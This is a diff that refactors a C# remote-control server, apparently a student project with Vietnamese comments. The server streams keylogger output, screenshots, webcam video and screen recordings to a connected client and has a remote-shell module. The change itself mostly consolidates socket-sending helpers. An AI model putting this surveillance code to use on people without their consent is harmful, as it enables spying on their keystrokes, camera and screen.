@@ -1,7 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -10,16 +8,12 @@ using System.Linq;
 using System.Management;
 using System.Net;
 using System.Net.Sockets;
-using System.Security;
 using System.Text;
 using System.Threading;
 using System.Timers;
 using System.Windows.Forms;
 
 using KeyLogger;
-using Microsoft.Win32;
-
-using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 
 
 namespace ServerApp
@@ -191,8 +185,9 @@ namespace ServerApp
                         // Vào vòng lặp xử lý lệnh (Block tại đây cho đến khi Client QUIT hoặc mất kết nối)
                         HandleClientCommunication();
                     }
-                    catch { 
-
+                    catch
+                    {
+                        // Lỗi xử lý client - tiếp tục vòng lặp chờ kết nối mới
                     }
                     finally
                     {
@@ -246,6 +241,48 @@ namespace ServerApp
         {
             try { s = Program.nr.ReadLine(); if (s == null) s = "QUIT"; }
             catch { s = "QUIT"; }
+        }
+
+        // Helper: Gửi response và flush
+        private void SendResponse(string message)
+        {
+            Program.nw.WriteLine(message);
+            Program.nw.Flush();
+        }
+
+        // Helper: Gửi bytes data (frame/video) qua socket
+        private void SendBytesData(byte[] data)
+        {
+            if (data != null && data.Length > 0)
+            {
+                SendResponse(data.Length.ToString());
+                Program.client.Send(data);
+            }
+            else
+            {
+                SendResponse("0");
+            }
+        }
+
+        // Helper: Gửi video bytes theo chunks
+        private void SendVideoChunks(byte[] videoBytes)
+        {
+            if (videoBytes == null || videoBytes.Length == 0)
+            {
+                SendResponse("0");
+                return;
+            }
+            
+            SendResponse(videoBytes.Length.ToString());
+            
+            const int chunkSize = 1024 * 1024; // 1 MB
+            int offset = 0;
+            while (offset < videoBytes.Length)
+            {
+                int currentChunkSize = Math.Min(chunkSize, videoBytes.Length - offset);
+                Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
+                offset += currentChunkSize;
+            }
         }
 
         // ==================== MODULE: REMOTE SHELL (CMD) ====================
@@ -395,14 +432,12 @@ namespace ServerApp
 
                     case "STATUS": // Kiểm tra trạng thái để hiển thị lên Web
                         bool isRunning = (tklog != null && tklog.IsAlive);
-                        Program.nw.WriteLine(isRunning ? "RUNNING" : "STOPPED");
-                        Program.nw.Flush();
+                        SendResponse(isRunning ? "RUNNING" : "STOPPED");
                         break;
 
                     case "CLEAR": // Xóa file log
                         try { File.WriteAllText(KeyLogger.appstart.path, ""); } catch { }
-                        Program.nw.WriteLine("Logs Cleared");
-                        Program.nw.Flush();
+                        SendResponse("Logs Cleared");
                         break;
 
                     case "PRINT": // Đọc file log gửi về Client
@@ -419,9 +454,7 @@ namespace ServerApp
                             }
                             catch { log = "Reading..."; }
                         }
-                        if (string.IsNullOrEmpty(log)) log = " ";
-                        Program.nw.WriteLine(log);
-                        Program.nw.Flush();
+                        SendResponse(string.IsNullOrEmpty(log) ? " " : log);
                         break;
 
                     case "QUIT": return;
@@ -442,20 +475,16 @@ namespace ServerApp
                 {
                     try
                     {
-                        // 1. Chụp màn hình
-                        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-                        Graphics g = Graphics.FromImage(bmp);
-                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
-
-                        // Gửi qua mạng về Client để lưu vào Django database
-                        MemoryStream ms = new MemoryStream();
-                        bmp.Save(ms, ImageFormat.Png);  // Đổi từ BMP sang PNG để file nhỏ hơn
-                        byte[] b = ms.ToArray();
-                        Program.nw.WriteLine(b.Length.ToString());
-                        Program.nw.Flush();
-                        Program.client.Send(b);
+                        using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
+                        using (Graphics g = Graphics.FromImage(bmp))
+                        using (MemoryStream ms = new MemoryStream())
+                        {
+                            g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
+                            bmp.Save(ms, ImageFormat.Png);
+                            SendBytesData(ms.ToArray());
+                        }
                     }
-                    catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
+                    catch { SendResponse("0"); }
                 }
             }
         }
@@ -656,136 +685,49 @@ namespace ServerApp
                         // Ta chỉ cần bỏ qua để vòng lặp đọc lệnh tiếp theo (VD: GET_FRAME).
                         break;
 
-                    case "ON": // Bật camera (chỉ preview, chưa ghi)
-                        {
-                            string result = webcamCapture.TurnOn();
-                            Program.nw.WriteLine(result);
-                            Program.nw.Flush();
-                            break;
-                        }
+                    case "ON":
+                        SendResponse(webcamCapture.TurnOn());
+                        break;
 
-                    case "OFF": // Tắt camera
-                        {
-                            string result = webcamCapture.TurnOff();
-                            Program.nw.WriteLine(result);
-                            Program.nw.Flush();
-                            break;
-                        }
+                    case "OFF":
+                        SendResponse(webcamCapture.TurnOff());
+                        break;
 
-                    case "GET_FRAME": // Lấy 1 frame hiện tại (cho streaming)
-                        {
-                            byte[] frameBytes = webcamCapture.GetCurrentFrameAsJpeg();
-                            
-                            if (frameBytes != null && frameBytes.Length > 0)
-                            {
-                                // Gửi size trước, sau đó gửi bytes
-                                Program.nw.WriteLine(frameBytes.Length.ToString());
-                                Program.nw.Flush();
-                                Program.client.Send(frameBytes);
-                            }
-                            else
-                            {
-                                // Không có frame
-                                Program.nw.WriteLine("0");
-                                Program.nw.Flush();
-                            }
-                            break;
-                        }
+                    case "GET_FRAME":
+                        SendBytesData(webcamCapture.GetCurrentFrameAsJpeg());
+                        break;
 
-                    case "START_REC": // Bắt đầu recording
-                        {
-                            string result = webcamCapture.StartRecording();
-                            Program.nw.WriteLine(result);
-                            Program.nw.Flush();
-                            break;
-                        }
+                    case "START_REC":
+                        SendResponse(webcamCapture.StartRecording());
+                        break;
 
                     case "STOP_REC": // Dừng recording, gửi video về Python
                         {
                             string result = webcamCapture.StopRecording();
-                            Program.nw.WriteLine(result);
-                            Program.nw.Flush();
+                            SendResponse(result);
                             
-                            // Nếu stop thành công, gửi file video
                             if (result.StartsWith("RECORDING_STOPPED"))
                             {
                                 string[] parts = result.Split('|');
                                 if (parts.Length >= 2 && !string.IsNullOrEmpty(parts[1]))
                                 {
-                                    string filename = parts[1];
-                                    byte[] videoBytes = webcamCapture.GetVideoBytes(filename);
-                                    
-                                    if (videoBytes != null && videoBytes.Length > 0)
-                                    {
-                                        // Gửi size
-                                        Program.nw.WriteLine(videoBytes.Length.ToString());
-                                        Program.nw.Flush();
-                                        
-                                        // Gửi bytes (chia nhỏ chunks nếu file lớn)
-                                        int chunkSize = 1024 * 1024; // 1 MB chunks
-                                        int offset = 0;
-                                        while (offset < videoBytes.Length)
-                                        {
-                                            int remaining = videoBytes.Length - offset;
-                                            int currentChunkSize = Math.Min(chunkSize, remaining);
-                                            Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
-                                            offset += currentChunkSize;
-                                        }
-                                    }
-                                    else
-                                    {
-                                        Program.nw.WriteLine("0");
-                                        Program.nw.Flush();
-                                    }
+                                    SendVideoChunks(webcamCapture.GetVideoBytes(parts[1]));
                                 }
                             }
                             break;
                         }
 
-                    case "STATUS": // Kiểm tra trạng thái
-                        {
-                            string status = webcamCapture.GetStatus();
-                            Program.nw.WriteLine(status);
-                            Program.nw.Flush();
-                            break;
-                        }
+                    case "STATUS":
+                        SendResponse(webcamCapture.GetStatus());
+                        break;
 
-                    case "GET_VIDEO": // Lấy video cụ thể (by filename)
-                        {
-                            string filename = Program.nr.ReadLine();
-                            byte[] videoBytes = webcamCapture.GetVideoBytes(filename);
-                            
-                            if (videoBytes != null && videoBytes.Length > 0)
-                            {
-                                Program.nw.WriteLine(videoBytes.Length.ToString());
-                                Program.nw.Flush();
-                                
-                                // Gửi chunks
-                                int chunkSize = 1024 * 1024;
-                                int offset = 0;
-                                while (offset < videoBytes.Length)
-                                {
-                                    int remaining = videoBytes.Length - offset;
-                                    int currentChunkSize = Math.Min(chunkSize, remaining);
-                                    Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
-                                    offset += currentChunkSize;
-                                }
-                            }
-                            else
-                            {
-                                Program.nw.WriteLine("0");
-                                Program.nw.Flush();
-                            }
-                            break;
-                        }
+                    case "GET_VIDEO":
+                        SendVideoChunks(webcamCapture.GetVideoBytes(Program.nr.ReadLine()));
+                        break;
 
-                    case "CLEAR": // Xóa tất cả videos
-                        {
-                            string result = webcamCapture.ClearAllRecordings();
-                            Program.nw.WriteLine(result);
-                            Program.nw.Flush();
-                            break;
-                        }
+                    case "CLEAR":
+                        SendResponse(webcamCapture.ClearAllRecordings());
+                        break;
 
                     case "QUIT": // Thoát module
                         return;
@@ -815,94 +757,41 @@ namespace ServerApp
                         // Bỏ qua nếu client gửi header lặp lại
                         break;
 
-                    case "START": // Bắt đầu Stream (tương đương ON bên Webcam)
-                        {
-                            string result = screenCapture.StartStream();
-                            Program.nw.WriteLine(result);
-                            Program.nw.Flush();
-                            break;
-                        }
+                    case "START":
+                        SendResponse(screenCapture.StartStream());
+                        break;
 
-                    case "STOP": // Dừng Stream (tương đương OFF bên Webcam)
-                        {
-                            string result = screenCapture.StopStream();
-                            Program.nw.WriteLine(result);
-                            Program.nw.Flush();
-                            break;
-                        }
+                    case "STOP":
+                        SendResponse(screenCapture.StopStream());
+                        break;
 
-                    case "GET_FRAME": // Lấy 1 frame màn hình (Live view)
-                        {
-                            byte[] frameBytes = screenCapture.GetCurrentFrameAsJpeg();
+                    case "GET_FRAME":
+                        SendBytesData(screenCapture.GetCurrentFrameAsJpeg());
+                        break;
 
-                            if (frameBytes != null && frameBytes.Length > 0)
-                            {
-                                Program.nw.WriteLine(frameBytes.Length.ToString());
-                                Program.nw.Flush();
-                                Program.client.Send(frameBytes);
-                            }
-                            else
-                            {
-                                Program.nw.WriteLine("0");
-                                Program.nw.Flush();
-                            }
-                            break;
-                        }
-
-                    case "START_REC": // Bắt đầu ghi file
-                        {
-                            string result = screenCapture.StartRecording();
-                            Program.nw.WriteLine(result);
-                            Program.nw.Flush();
-                            break;
-                        }
+                    case "START_REC":
+                        SendResponse(screenCapture.StartRecording());
+                        break;
 
                     case "STOP_REC": // Dừng ghi và gửi file về
                         {
                             string result = screenCapture.StopRecording();
-                            Program.nw.WriteLine(result);
-                            Program.nw.Flush();
+                            SendResponse(result);
 
                             if (result.StartsWith("RECORDING_STOPPED"))
                             {
                                 string[] parts = result.Split('|');
                                 if (parts.Length >= 2 && !string.IsNullOrEmpty(parts[1]))
                                 {
-                                    string filename = parts[1];
-                                    byte[] videoBytes = screenCapture.GetVideoBytes(filename);
-
-                                    if (videoBytes != null && videoBytes.Length > 0)
-                                    {
-                                        Program.nw.WriteLine(videoBytes.Length.ToString());
-                                        Program.nw.Flush();
-
-                                        int chunkSize = 1024 * 1024;
-                                        int offset = 0;
-                                        while (offset < videoBytes.Length)
-                                        {
-                                            int remaining = videoBytes.Length - offset;
-                                            int currentChunkSize = Math.Min(chunkSize, remaining);
-                                            Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
-                                            offset += currentChunkSize;
-                                        }
-                                    }
-                                    else
-                                    {
-                                        Program.nw.WriteLine("0");
-                                        Program.nw.Flush();
-                                    }
+                                    SendVideoChunks(screenCapture.GetVideoBytes(parts[1]));
                                 }
                             }
                             break;
                         }
 
                     case "STATUS":
-                        {
-                            string status = screenCapture.GetStatus();
-                            Program.nw.WriteLine(status);
-                            Program.nw.Flush();
-                            break;
-                        }
+                        SendResponse(screenCapture.GetStatus());
+                        break;
 
                     case "QUIT": // Thoát module
                         return;
@@ -988,14 +877,11 @@ namespace ServerApp
         {
             try
             {
-                // Gửi ngay lập tức dữ liệu đã được Timer chuẩn bị sẵn
-                Program.nw.WriteLine(cachedSystemInfo);
-                Program.nw.Flush();
+                SendResponse(cachedSystemInfo);
             }
             catch (Exception ex)
             {
-                Program.nw.WriteLine("ERROR|" + ex.Message);
-                Program.nw.Flush();
+                SendResponse("ERROR|" + ex.Message);
             }
         }
     }
